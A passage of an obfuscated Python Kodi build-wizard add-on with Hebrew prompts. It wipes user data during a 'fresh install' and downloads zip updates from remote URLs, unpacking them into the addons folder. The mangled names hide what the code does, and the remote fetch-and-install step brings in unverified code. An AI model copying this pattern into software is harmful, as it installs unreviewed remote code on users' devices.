				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4690
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'program.apollo'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4691
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4692
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.video.elementum'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4695
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4696
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4697
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.video.quasar'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4699
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'program.apollo'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4700
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4701
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4702
				elif O0OO000000OOO00OO in LOGFILES :wiz .log ("Keep Log File: %s"%O0OO000000OOO00OO ,xbmc .LOGNOTICE )#line:4703
				elif O0OO000000OOO00OO .endswith ('.db'):#line:4704
					try :#line:4705
						if O0OO000000OOO00OO ==OOO0000O0O0OO0000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0OO000000OOO00OO ,KODIV ),xbmc .LOGNOTICE )#line:4706
						else :os .remove (os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ))#line:4707
					except Exception as OO0O00OOO0O000000 :#line:4708
						if not O0OO000000OOO00OO .startswith ('Textures13'):#line:4709
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4710
							wiz .log ("-> %s"%(str (OO0O00OOO0O000000 )),xbmc .LOGNOTICE )#line:4711
							wiz .purgeDb (os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ))#line:4712
				else :#line:4713
					DP .update (int (wiz .percentage (O00000000O0O0O0OO ,O00O0OO00OOO00000 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO000000OOO00OO ),'')#line:4714
					try :os .remove (os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ))#line:4715
					except Exception as OO0O00OOO0O000000 :#line:4716
						wiz .log ("Error removing %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4717
						wiz .log ("-> / %s"%(str (OO0O00OOO0O000000 )),xbmc .LOGNOTICE )#line:4718
			if DP .iscanceled ():#line:4719
				DP .close ()#line:4720
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4721
				return False #line:4722
		for OO000O0OO0OO0O000 ,O00O00O0OOOO0O0OO ,O00OOOO00000O0000 in os .walk (OOO00O0OO00O00OO0 ,topdown =True ):#line:4723
			O00O00O0OOOO0O0OO [:]=[OOO00OOOO00OO0O00 for OOO00OOOO00OO0O00 in O00O00O0OOOO0O0OO if OOO00OOOO00OO0O00 not in EXCLUDES ]#line:4724
			for O0OO000000OOO00OO in O00O00O0OOOO0O0OO :#line:4725
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO000000OOO00OO ),'')#line:4726
			  if O0OO000000OOO00OO not in ["Database","userdata","temp","addons","addon_data"]:#line:4727
			   if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4728
			    if not (O0OO000000OOO00OO =='skin.titan'and KEEPSKIN3 =='true'):#line:4730
			      if not (O0OO000000OOO00OO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4731
			       if not (O0OO000000OOO00OO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4732
			        if not (O0OO000000OOO00OO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4733
			         if not (O0OO000000OOO00OO =='program.apollo'and KEEPINFO =='true'):#line:4734
			          if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4735
			            if not (O0OO000000OOO00OO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4737
			             if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4738
			              if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4739
			               if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4740
			                if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4741
			                 if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4742
			                  if not (O0OO000000OOO00OO =='plugin.video.neptune'and KEEPINFO =='true'):#line:4743
			                   if not (O0OO000000OOO00OO =='plugin.video.youtube'and KEEPINFO =='true'):#line:4744
			                    if not (O0OO000000OOO00OO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4745
			                     if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4746
			                       if not (O0OO000000OOO00OO =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4748
			                           if not (O0OO000000OOO00OO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4752
			                            if not (O0OO000000OOO00OO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4753
			                             if not (O0OO000000OOO00OO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4754
			                              if not (O0OO000000OOO00OO =='plugin.video.quasar'and KEEPINFO =='true'):#line:4755
			                               if not (O0OO000000OOO00OO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4756
			                                  shutil .rmtree (os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),ignore_errors =True ,onerror =None )#line:4758
			if DP .iscanceled ():#line:4759
				DP .close ()#line:4760
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4761
				return False #line:4762
		DP .close ()#line:4763
		wiz .clearS ('build')#line:4764
		if over ==True :#line:4765
			return True #line:4766
		elif install =='restore':#line:4767
			return True #line:4768
		elif install :#line:4769
			buildWizard (install ,'normal',over =True )#line:4770
		else :#line:4771
			if INSTALLMETHOD ==1 :OO0O0O0OOO0O0OOO0 =1 #line:4772
			elif INSTALLMETHOD ==2 :OO0O0O0OOO0O0OOO0 =0 #line:4773
			else :OO0O0O0OOO0O0OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4774
			if OO0O0O0OOO0O0OOO0 ==1 :wiz .reloadFix ('fresh')#line:4775
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4776
	else :#line:4777
		if not install =='restore':#line:4778
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4779
			wiz .refresh ()#line:4780
def clearCache ():#line:4785
		wiz .clearCache ()#line:4786
def fixwizard ():#line:4790
		wiz .fixwizard ()#line:4791
def totalClean ():#line:4793
		wiz .clearCache ()#line:4795
		wiz .clearPackages ('total')#line:4796
		clearThumb ('total')#line:4797
		cleanfornewbuild ()#line:4798
def cleanfornewbuild ():#line:4799
		try :#line:4800
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4801
		except :#line:4802
			pass #line:4803
		try :#line:4804
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4805
		except :#line:4806
			pass #line:4807
		try :#line:4808
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4809
		except :#line:4810
			pass #line:4811
def clearThumb (type =None ):#line:4812
	OO00OOO0OO000O000 =wiz .latestDB ('Textures')#line:4813
	if not type ==None :O0OO0OOOO00O00000 =1 #line:4814
	else :O0OO0OOOO00O00000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00OOO0OO000O000 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4815
	if O0OO0OOOO00O00000 ==1 :#line:4816
		try :wiz .removeFile (os .join (DATABASE ,OO00OOO0OO000O000 ))#line:4817
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00OOO0OO000O000 )#line:4818
		wiz .removeFolder (THUMBS )#line:4819
	else :wiz .log ('Clear thumbnames cancelled')#line:4821
	wiz .redoThumbs ()#line:4822
def purgeDb ():#line:4824
	OO00O000OOO0OO0O0 =[];OOO0O00OO0OO00O00 =[]#line:4825
	for OOOO0O000OO00O0OO ,O00OOO0OOOO0O0OO0 ,OO000OO0O000OOOO0 in os .walk (HOME ):#line:4826
		for OOO000O000OOOOOOO in fnmatch .filter (OO000OO0O000OOOO0 ,'*.db'):#line:4827
			if OOO000O000OOOOOOO !='Thumbs.db':#line:4828
				OOO00OO0OO0000O00 =os .path .join (OOOO0O000OO00O0OO ,OOO000O000OOOOOOO )#line:4829
				OO00O000OOO0OO0O0 .append (OOO00OO0OO0000O00 )#line:4830
				OO00OO0O000O0OO0O =OOO00OO0OO0000O00 .replace ('\\','/').split ('/')#line:4831
				OOO0O00OO0OO00O00 .append ('(%s) %s'%(OO00OO0O000O0OO0O [len (OO00OO0O000O0OO0O )-2 ],OO00OO0O000O0OO0O [len (OO00OO0O000O0OO0O )-1 ]))#line:4832
	if KODIV >=16 :#line:4833
		OOO0OOO0000OOOOOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOO0O00OO0OO00O00 )#line:4834
		if OOO0OOO0000OOOOOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4835
		elif len (OOO0OOO0000OOOOOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4836
		else :#line:4837
			for OOOO00O0O0O00O000 in OOO0OOO0000OOOOOO :wiz .purgeDb (OO00O000OOO0OO0O0 [OOOO00O0O0O00O000 ])#line:4838
	else :#line:4839
		OOO0OOO0000OOOOOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOO0O00OO0OO00O00 )#line:4840
		if OOO0OOO0000OOOOOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4841
		else :wiz .purgeDb (OO00O000OOO0OO0O0 [OOOO00O0O0O00O000 ])#line:4842
def fastupdatefirstbuild (O0O0O00OOO00O0O00 ):#line:4848
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4849
	if ENABLE =='Yes':#line:4850
		if not NOTIFY =='true':#line:4851
			OOOOOOO0OOO00O000 =wiz .workingURL (NOTIFICATION )#line:4852
			if OOOOOOO0OOO00O000 ==True :#line:4853
				O0O0OO00OOOO0O000 ,OO0O0O0O0OOO000OO =wiz .splitNotify (NOTIFICATION )#line:4854
				if not O0O0OO00OOOO0O000 ==False :#line:4856
					try :#line:4857
						O0O0OO00OOOO0O000 =int (O0O0OO00OOOO0O000 );O0O0O00OOO00O0O00 =int (O0O0O00OOO00O0O00 )#line:4858
						checkidupdate ()#line:4859
						wiz .setS ("notedismiss","true")#line:4860
						if O0O0OO00OOOO0O000 ==O0O0O00OOO00O0O00 :#line:4861
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0O0OO00OOOO0O000 ),xbmc .LOGNOTICE )#line:4862
						elif O0O0OO00OOOO0O000 >O0O0O00OOO00O0O00 :#line:4864
							wiz .log ("[Notifications] id: %s"%str (O0O0OO00OOOO0O000 ),xbmc .LOGNOTICE )#line:4865
							wiz .setS ('noteid',str (O0O0OO00OOOO0O000 ))#line:4866
							wiz .setS ("notedismiss","true")#line:4867
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4870
					except Exception as OO00OO000OO0O0OOO :#line:4871
						wiz .log ("Error on Notifications Window: %s"%str (OO00OO000OO0O0OOO ),xbmc .LOGERROR )#line:4872
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4874
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOOOOO0OOO00O000 ),xbmc .LOGNOTICE )#line:4875
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4876
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4877
def checkidupdate ():#line:4883
				wiz .setS ("notedismiss","true")#line:4885
				OOOO0OO0OOO0O0O00 =wiz .workingURL (NOTIFICATION )#line:4886
				OOO00OO0OOO0000O0 =" Kodi Premium"#line:4888
				OOO0O0000O0O00O00 =wiz .checkBuild (OOO00OO0OOO0000O0 ,'gui')#line:4889
				OOOOOO0O0O0O000OO =OOO00OO0OOO0000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4890
				if not wiz .workingURL (OOO0O0000O0O00O00 )==True :return #line:4891
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4892
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO00OO0OOO0000O0 ),'','אנא המתן')#line:4893
				O0OO00OO00000O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO0O0O0O000OO )#line:4894
				try :os .remove (O0OO00OO00000O0O0 )#line:4895
				except :pass #line:4896
				logging .warning (OOO0O0000O0O00O00 )#line:4897
				if 'google'in OOO0O0000O0O00O00 :#line:4898
				   O0O0O000OO00OO00O =googledrive_download (OOO0O0000O0O00O00 ,O0OO00OO00000O0O0 ,DP ,wiz .checkBuild (OOO00OO0OOO0000O0 ,'filesize'))#line:4899
				else :#line:4902
				  downloader .download (OOO0O0000O0O00O00 ,O0OO00OO00000O0O0 ,DP )#line:4903
				xbmc .sleep (100 )#line:4904
				OO00OOO00O0000O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OO0OOO0000O0 )#line:4905
				DP .update (0 ,OO00OOO00O0000O0O ,'','אנא המתן')#line:4906
				extract .all (O0OO00OO00000O0O0 ,HOME ,DP ,title =OO00OOO00O0000O0O )#line:4907
				DP .close ()#line:4908
				wiz .defaultSkin ()#line:4909
				wiz .lookandFeelData ('save')#line:4910
				if KODIV >=18 :#line:4911
					skindialogsettind18 ()#line:4912
				if INSTALLMETHOD ==1 :OO0OOO00000OOO000 =1 #line:4915
				elif INSTALLMETHOD ==2 :OO0OOO00000OOO000 =0 #line:4916
				else :DP .close ()#line:4917
def gaiaserenaddon ():#line:4919
  OOO0OOO0O0OO00OO0 =(ADDON .getSetting ("gaiaseren"))#line:4920
  O0O000O0O00O000OO =(ADDON .getSetting ("rdbuild"))#line:4921
  if OOO0OOO0O0OO00OO0 =='true'and O0O000O0O00O000OO =='true':#line:4922
    OOOOOO0O000O00OOO =(NEWFASTUPDATE )#line:4923
    O0OO0OO0OOOOOOO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4924
    O000OO0O00O0O00OO =xbmcgui .DialogProgress ()#line:4925
    O000OO0O00O0O00OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4926
    OO0OO000OOO0000OO =os .path .join (PACKAGES ,'isr.zip')#line:4927
    OO0O00O0OO0O0OOOO =urllib2 .Request (OOOOOO0O000O00OOO )#line:4928
    OO00OO0OOO0O00O0O =urllib2 .urlopen (OO0O00O0OO0O0OOOO )#line:4929
    OOOO000O0OO00O0O0 =xbmcgui .DialogProgress ()#line:4931
    OOOO000O0OO00O0O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4932
    OOOO000O0OO00O0O0 .update (0 )#line:4933
    O0O0O00OOOOOOO000 =open (OO0OO000OOO0000OO ,'wb')#line:4935
    try :#line:4937
      O00OOOO000O00OO0O =OO00OO0OOO0O00O0O .info ().getheader ('Content-Length').strip ()#line:4938
      O0OO000OO0O0OO00O =True #line:4939
    except AttributeError :#line:4940
          O0OO000OO0O0OO00O =False #line:4941
    if O0OO000OO0O0OO00O :#line:4943
          O00OOOO000O00OO0O =int (O00OOOO000O00OO0O )#line:4944
    OOOO0OO00000O0OO0 =0 #line:4946
    O0O00OOOO0O00O00O =time .time ()#line:4947
    while True :#line:4948
          O0O0O0000O00O00OO =OO00OO0OOO0O00O0O .read (8192 )#line:4949
          if not O0O0O0000O00O00OO :#line:4950
              sys .stdout .write ('\n')#line:4951
              break #line:4952
          OOOO0OO00000O0OO0 +=len (O0O0O0000O00O00OO )#line:4954
          O0O0O00OOOOOOO000 .write (O0O0O0000O00O00OO )#line:4955
          if not O0OO000OO0O0OO00O :#line:4957
              O00OOOO000O00OO0O =OOOO0OO00000O0OO0 #line:4958
          if OOOO000O0OO00O0O0 .iscanceled ():#line:4959
             OOOO000O0OO00O0O0 .close ()#line:4960
             try :#line:4961
              os .remove (OO0OO000OOO0000OO )#line:4962
             except :#line:4963
              pass #line:4964
             break #line:4965
          OO0O00O00OOO0000O =float (OOOO0OO00000O0OO0 )/O00OOOO000O00OO0O #line:4966
          OO0O00O00OOO0000O =round (OO0O00O00OOO0000O *100 ,2 )#line:4967
          O0OOOO00O0O0OO0O0 =OOOO0OO00000O0OO0 /(1024 *1024 )#line:4968
          OOO0O000OOOOOOO0O =O00OOOO000O00OO0O /(1024 *1024 )#line:4969
          O0OOOO000O0OOOO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOO00O0O0OO0O0 ,'teal',OOO0O000OOOOOOO0O )#line:4970
          if (time .time ()-O0O00OOOO0O00O00O )>0 :#line:4971
            OOOOO000OO0O00OO0 =OOOO0OO00000O0OO0 /(time .time ()-O0O00OOOO0O00O00O )#line:4972
            OOOOO000OO0O00OO0 =OOOOO000OO0O00OO0 /1024 #line:4973
          else :#line:4974
           OOOOO000OO0O00OO0 =0 #line:4975
          O0O0OOO0000OO000O ='KB'#line:4976
          if OOOOO000OO0O00OO0 >=1024 :#line:4977
             OOOOO000OO0O00OO0 =OOOOO000OO0O00OO0 /1024 #line:4978
             O0O0OOO0000OO000O ='MB'#line:4979
          if OOOOO000OO0O00OO0 >0 and not OO0O00O00OOO0000O ==100 :#line:4980
              O000O0OOO0O0000OO =(O00OOOO000O00OO0O -OOOO0OO00000O0OO0 )/OOOOO000OO0O00OO0 #line:4981
          else :#line:4982
              O000O0OOO0O0000OO =0 #line:4983
          OOOOO00OO0O0O0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO000OO0O00OO0 ,O0O0OOO0000OO000O )#line:4984
          OOOO000O0OO00O0O0 .update (int (OO0O00O00OOO0000O ),O0OOOO000O0OOOO00 ,OOOOO00OO0O0O0O0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4986
    O0OOO0OOO00OO000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4989
    O0O0O00OOOOOOO000 .close ()#line:4992
    extract .all (OO0OO000OOO0000OO ,O0OOO0OOO00OO000O ,OOOO000O0OO00O0O0 )#line:4993
    try :#line:4997
      os .remove (OO0OO000OOO0000OO )#line:4998
    except :#line:4999
      pass #line:5000
def testnotify ():#line:5002
	OOO00O00OO0O0OOO0 =wiz .workingURL (NOTIFICATION )#line:5003
	if OOO00O00OO0O0OOO0 ==True :#line:5004
		try :#line:5005
			O000O0O0OO0OO000O ,OO0000O0O0OO0000O =wiz .splitNotify (NOTIFICATION )#line:5006
			if O000O0O0OO0OO000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5007
			if STARTP2 ()=='ok':#line:5008
				notify .notification (OO0000O0O0OO0000O ,True )#line:5009
		except Exception as O0000O00O0OOO0OO0 :#line:5010
			wiz .log ("Error on Notifications Window: %s"%str (O0000O00O0OOO0OO0 ),xbmc .LOGERROR )#line:5011
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5012
def testnotify2 ():#line:5013
	O000O0000O0O00O0O =wiz .workingURL (NOTIFICATION2 )#line:5014
	if O000O0000O0O00O0O ==True :#line:5015
		try :#line:5016
			OO000O00O0O0OOO00 ,O0O00O0OOOOOOO0O0 =wiz .splitNotify (NOTIFICATION2 )#line:5017
			if OO000O00O0O0OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5018
			if STARTP2 ()=='ok':#line:5019
				notify .notification2 (O0O00O0OOOOOOO0O0 ,True )#line:5020
		except Exception as OO0OOO0OO0OOOOO00 :#line:5021
			wiz .log ("Error on Notifications Window: %s"%str (OO0OOO0OO0OOOOO00 ),xbmc .LOGERROR )#line:5022
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5023
def testnotify3 ():#line:5024
	O0OO0O000000O0O00 =wiz .workingURL (NOTIFICATION3 )#line:5025
	if O0OO0O000000O0O00 ==True :#line:5026
		try :#line:5027
			O0OOOOOO0OO0O0OO0 ,O00O0O0O0OOOO000O =wiz .splitNotify (NOTIFICATION3 )#line:5028
			if O0OOOOOO0OO0O0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5029
			if STARTP2 ()=='ok':#line:5030
				notify .notification3 (O00O0O0O0OOOO000O ,True )#line:5031
		except Exception as O00O0OO00OO0O0O0O :#line:5032
			wiz .log ("Error on Notifications Window: %s"%str (O00O0OO00OO0O0O0O ),xbmc .LOGERROR )#line:5033
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5034
def servicemanual ():#line:5035
	OO0O0O000000OO0O0 =wiz .workingURL (HELPINFO )#line:5036
	if OO0O0O000000OO0O0 ==True :#line:5037
		try :#line:5038
			OOOOOO0O00O0OOO00 ,OOO0OO0O00OO0000O =wiz .splitNotify (HELPINFO )#line:5039
			if OOOOOO0O00O0OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5040
			notify .helpinfo (OOO0OO0O00OO0000O ,True )#line:5041
		except Exception as OO0O000O00OOO00O0 :#line:5042
			wiz .log ("Error on Notifications Window: %s"%str (OO0O000O00OOO00O0 ),xbmc .LOGERROR )#line:5043
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5044
def testupdate ():#line:5046
	if BUILDNAME =="":#line:5047
		notify .updateWindow ()#line:5048
	else :#line:5049
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5050
def testfirst ():#line:5052
	notify .firstRun ()#line:5053
def testfirstRun ():#line:5055
	notify .firstRunSettings ()#line:5056
def fastinstall ():#line:5059
	notify .firstRuninstall ()#line:5060
def addDir (O000000OOO00OOOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5067
	OOO00000O0OOO0O00 =sys .argv [0 ]#line:5068
	if not mode ==None :OOO00000O0OOO0O00 +="?mode=%s"%urllib .quote_plus (mode )#line:5069
	if not name ==None :OOO00000O0OOO0O00 +="&name="+urllib .quote_plus (name )#line:5070
	if not url ==None :OOO00000O0OOO0O00 +="&url="+urllib .quote_plus (url )#line:5071
	OO0OOOO0O0OO00O0O =True #line:5072
	if themeit :O000000OOO00OOOO0 =themeit %O000000OOO00OOOO0 #line:5073
	OOO00OO0OOO0O000O =xbmcgui .ListItem (O000000OOO00OOOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5074
	OOO00OO0OOO0O000O .setInfo (type ="Video",infoLabels ={"Title":O000000OOO00OOOO0 ,"Plot":description })#line:5075
	OOO00OO0OOO0O000O .setProperty ("Fanart_Image",fanart )#line:5076
	if not menu ==None :OOO00OO0OOO0O000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5077
	OO0OOOO0O0OO00O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO00000O0OOO0O00 ,listitem =OOO00OO0OOO0O000O ,isFolder =True )#line:5078
	return OO0OOOO0O0OO00O0O #line:5079
